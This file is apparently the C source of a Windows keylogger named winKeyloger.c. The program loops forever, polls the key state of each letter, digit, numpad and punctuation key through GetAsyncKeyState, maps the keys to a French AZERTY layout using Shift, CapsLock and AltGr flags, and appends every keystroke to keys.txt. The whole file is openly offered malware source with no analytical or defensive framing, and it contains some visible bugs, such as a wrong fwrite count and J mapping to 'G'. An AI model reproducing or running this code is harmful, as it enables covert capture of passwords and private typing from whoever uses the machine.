/**
 * author: Samy11696
 * winKeyloger.c
 */

#include <stdio.h>
#include <windows.h>
#include <string.h>
void writetf(char buffer[])
{
    FILE *myfile;
    myfile = fopen("keys.txt", "a");
    fwrite(buffer, strlen(buffer),strlen(buffer),myfile);
    fclose(myfile);
}
int main()
{
    int CAP_flag   = 0;
    int SHIFT_flag = 0;
    int ALT_flag   = 0;
    char keys[100] = {0};
    while(1){
            if(strlen(keys) != 0){writetf(keys);memset(keys,0,strlen(keys));}
            if((GetAsyncKeyState(0x30)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1 && ALT_flag == 0){strcat(keys,"0");}else if(CAP_flag == 0 && ALT_flag == 0){strcat(keys,"à");}else if(ALT_flag == 1){strcat(keys,"@");}
            }else if((GetAsyncKeyState(0x31)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"1");}else if(CAP_flag == 0){strcat(keys,"&");}
            }else if((GetAsyncKeyState(0x32)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"2");}else if(CAP_flag == 0){strcat(keys,"é");}
            }else if((GetAsyncKeyState(0x33)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1 && ALT_flag == 0){strcat(keys,"3");}else if(CAP_flag == 0 && ALT_flag == 0){strcat(keys,"\"");}else if(ALT_flag == 1){strcat(keys,"#");}
            }else if((GetAsyncKeyState(0x34)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1 && ALT_flag == 0){strcat(keys,"4");}else if(CAP_flag == 0 && ALT_flag == 0){strcat(keys,"'");}else if(ALT_flag == 1){strcat(keys,"{");}
            }else if((GetAsyncKeyState(0x35)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1 && ALT_flag == 0){strcat(keys,"5");}else if(CAP_flag == 0 && ALT_flag == 0){strcat(keys,"(");}else if(ALT_flag == 1){strcat(keys,"[");}
            }else if((GetAsyncKeyState(0x36)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1 && ALT_flag == 0){strcat(keys,"6");}else if(CAP_flag == 0 && ALT_flag == 0){strcat(keys,"-");}else if(ALT_flag == 1){strcat(keys,"|");}
            }else if((GetAsyncKeyState(0x37)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"7");}else if(CAP_flag == 0){strcat(keys,"è");}
            }else if((GetAsyncKeyState(0x38)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1 && ALT_flag == 0){strcat(keys,"8");}else if(CAP_flag == 0 && ALT_flag == 0){strcat(keys,"_");}else if(ALT_flag == 1){strcat(keys,"\"");}
            }else if((GetAsyncKeyState(0x39)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1 && ALT_flag == 0){strcat(keys,"9");}else if(CAP_flag == 0 && ALT_flag == 0){strcat(keys,"ç");}else if(ALT_flag == 1){strcat(keys,"^");}
            }else if((GetAsyncKeyState(0x41)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"A");}else if(CAP_flag == 0){strcat(keys,"a");}
            }else if((GetAsyncKeyState(0x42)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"B");}else if(CAP_flag == 0){strcat(keys,"b");}
            }else if((GetAsyncKeyState(0x43)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"C");}else if(CAP_flag == 0){strcat(keys,"c");}
            }else if((GetAsyncKeyState(0x44)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"D");}else if(CAP_flag == 0){strcat(keys,"d");}
            }else if((GetAsyncKeyState(0x45)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"E");}else if(CAP_flag == 0){strcat(keys,"e");}
            }else if((GetAsyncKeyState(0x46)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"F");}else if(CAP_flag == 0){strcat(keys,"f");}
            }else if((GetAsyncKeyState(0x47)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"G");}else if(CAP_flag == 0){strcat(keys,"g");}
            }else if((GetAsyncKeyState(0x48)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"H");}else if(CAP_flag == 0){strcat(keys,"h");}
            }else if((GetAsyncKeyState(0x49)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"I");}else if(CAP_flag == 0){strcat(keys,"i");}
            }else if((GetAsyncKeyState(0x4A)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"G");}else if(CAP_flag == 0){strcat(keys,"j");}
            }else if((GetAsyncKeyState(0x4B)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"K");}else if(CAP_flag == 0){strcat(keys,"k");}
            }else if((GetAsyncKeyState(0x4C)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"L");}else if(CAP_flag == 0){strcat(keys,"l");}
            }else if((GetAsyncKeyState(0x4D)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"M");}else if(CAP_flag == 0){strcat(keys,"m");}
            }else if((GetAsyncKeyState(0x4E)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"N");}else if(CAP_flag == 0){strcat(keys,"n");}
            }else if((GetAsyncKeyState(0x4F)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"O");}else if(CAP_flag == 0){strcat(keys,"o");}
            }else if((GetAsyncKeyState(0x50)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"P");}else if(CAP_flag == 0){strcat(keys,"p");}
            }else if((GetAsyncKeyState(0x51)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"Q");}else if(CAP_flag == 0){strcat(keys,"q");}
            }else if((GetAsyncKeyState(0x52)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"R");}else if(CAP_flag == 0){strcat(keys,"r");}
            }else if((GetAsyncKeyState(0x53)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"S");}else if(CAP_flag == 0){strcat(keys,"s");}
            }else if((GetAsyncKeyState(0x54)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"T");}else if(CAP_flag == 0){strcat(keys,"t");}
            }else if((GetAsyncKeyState(0x55)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"U");}else if(CAP_flag == 0){strcat(keys,"u");}
            }else if((GetAsyncKeyState(0x56)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"V");}else if(CAP_flag == 0){strcat(keys,"v");}
            }else if((GetAsyncKeyState(0x57)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"W");}else if(CAP_flag == 0){strcat(keys,"w");}
            }else if((GetAsyncKeyState(0x58)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"X");}else if(CAP_flag == 0){strcat(keys,"x");}
            }else if((GetAsyncKeyState(0x59)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"Y");}else if(CAP_flag == 0){strcat(keys,"y");}
            }else if((GetAsyncKeyState(0x5A)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"Z");}else if(CAP_flag == 0){strcat(keys,"z");}
            }else if((GetAsyncKeyState(0xBB)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1 && ALT_flag == 0){strcat(keys,"+");}else if(CAP_flag == 0 && ALT_flag == 0){strcat(keys,"=");}else if(ALT_flag == 1){strcat(keys,"}");}
            }else if((GetAsyncKeyState(0xBC)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"?");}else if(CAP_flag == 0){strcat(keys,",");}
            }else if((GetAsyncKeyState(0xBA)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1 && ALT_flag == 0){strcat(keys,"£");}else if(CAP_flag == 0 && ALT_flag == 0){strcat(keys,"$");}else if(ALT_flag == 1){strcat(keys,"¤");}
            }else if((GetAsyncKeyState(0xBE)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,".");}else if(CAP_flag == 0){strcat(keys,";");}
            }else if((GetAsyncKeyState(0xBF)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"/");}else if(CAP_flag == 0){strcat(keys,":");}
            }else if((GetAsyncKeyState(0xC0)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"ù");}else if(CAP_flag == 0){strcat(keys,"%");}
            }else if((GetAsyncKeyState(0xDB)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1 && ALT_flag == 0){strcat(keys,"°");}else if(CAP_flag == 0 && ALT_flag == 0){strcat(keys,")");}else if(ALT_flag == 1){strcat(keys,"]");}
            }else if((GetAsyncKeyState(0xDC)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"µ");}else if(CAP_flag == 0){strcat(keys,"*");}
            }else if((GetAsyncKeyState(0xDD)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"¨¨");}else if(CAP_flag == 0){strcat(keys,"^^");}
            }else if((GetAsyncKeyState(0xDE)) == -32767){strcat(keys,"²");
            }else if((GetAsyncKeyState(0xDF)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1){strcat(keys,"§");}else if(CAP_flag == 0){strcat(keys,"!");}
            }else if((GetAsyncKeyState(0xDE)) == -32767){
                if(SHIFT_flag == 1){strcat(keys,">");}else if(CAP_flag == 1 || CAP_flag == 0){strcat(keys,"<");}
            }else if((GetAsyncKeyState(0x30)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1 && ALT_flag == 0){strcat(keys,"0");}else if(CAP_flag == 0 && ALT_flag == 0){strcat(keys,"à");}else if(ALT_flag == 1){strcat(keys,"@");}
            }else if((GetAsyncKeyState(0x30)) == -32767){
                if(CAP_flag == 1 || SHIFT_flag == 1 && ALT_flag == 0){strcat(keys,"0");}else if(CAP_flag == 0 && ALT_flag == 0){strcat(keys,"à");}else if(ALT_flag == 1){strcat(keys,"@");}
            }else if((GetAsyncKeyState(0x60)) == -32767){strcat(keys,"0");
            }else if((GetAsyncKeyState(0x61)) == -32767){strcat(keys,"1");
            }else if((GetAsyncKeyState(0x62)) == -32767){strcat(keys,"2");
            }else if((GetAsyncKeyState(0x63)) == -32767){strcat(keys,"3");
            }else if((GetAsyncKeyState(0x64)) == -32767){strcat(keys,"4");
            }else if((GetAsyncKeyState(0x65)) == -32767){strcat(keys,"5");
            }else if((GetAsyncKeyState(0x66)) == -32767){strcat(keys,"6");
            }else if((GetAsyncKeyState(0x67)) == -32767){strcat(keys,"7");
            }else if((GetAsyncKeyState(0x68)) == -32767){strcat(keys,"8");
            }else if((GetAsyncKeyState(0x69)) == -32767){strcat(keys,"9");
            }else if((GetAsyncKeyState(0x6A)) == -32767){strcat(keys,"*");
            }else if((GetAsyncKeyState(0x6B)) == -32767){strcat(keys,"+");
            }else if((GetAsyncKeyState(0x6C)) == -32767){strcat(keys,".");
            }else if((GetAsyncKeyState(0x6D)) == -32767){strcat(keys,"-");
            }else if((GetAsyncKeyState(0x6F)) == -32767){strcat(keys,"/");
            }else if((GetAsyncKeyState(0x20)) == -32767){strcat(keys," ");
            }else if((GetAsyncKeyState(0x09)) == -32767){strcat(keys,"\t");
            }else if((GetAsyncKeyState(0x0C)) == -32767){strcat(keys,"\r");
            }else if((GetAsyncKeyState(0x0D)) == -32767){strcat(keys,"\n");
            }else if((GetAsyncKeyState(0x10)) == -32767){SHIFT_flag = 1;
            }else if((GetAsyncKeyState(0x10)) == 0){SHIFT_flag = 0;
            }else if((GetKeyState(0x14)) == 1){CAP_flag = 1;}else if((GetKeyState(0x14) == 0)){CAP_flag = 0;
            }
            if((GetAsyncKeyState(0xA5)) == -32768){ALT_flag = 1;}else if((GetAsyncKeyState(0xA5)) == 0){ALT_flag = 0;}

    }
    return 0;
}



